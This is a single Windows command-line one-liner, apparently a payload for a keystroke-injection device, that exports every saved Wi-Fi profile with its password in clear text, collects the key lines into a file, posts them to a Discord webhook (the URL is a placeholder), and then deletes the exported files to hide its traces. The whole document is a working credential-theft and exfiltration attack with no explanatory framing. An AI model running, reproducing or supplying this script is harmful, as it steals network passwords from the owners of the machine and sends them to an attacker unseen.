cd %USERPROFILE%\Desktop\ && netsh wlan export profile key=clear && powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS.txt && powershell -c "$content = [System.IO.File]::ReadAllText('%USERPROFILE%\Desktop\Wi-Fi-PASS.txt').Trim(); $body = @{content = [string]$content} | ConvertTo-Json -Compress; Invoke-RestMethod -Uri 'https://discordapp.com/api/webhooks/YOUR-DISCORD-WEBHOOK-HERE' -Method Post -Body $body -ContentType 'application/json' -Headers @{'Content-Type'='application/json; charset=utf-8'}" && del Wi-* /s /f /q
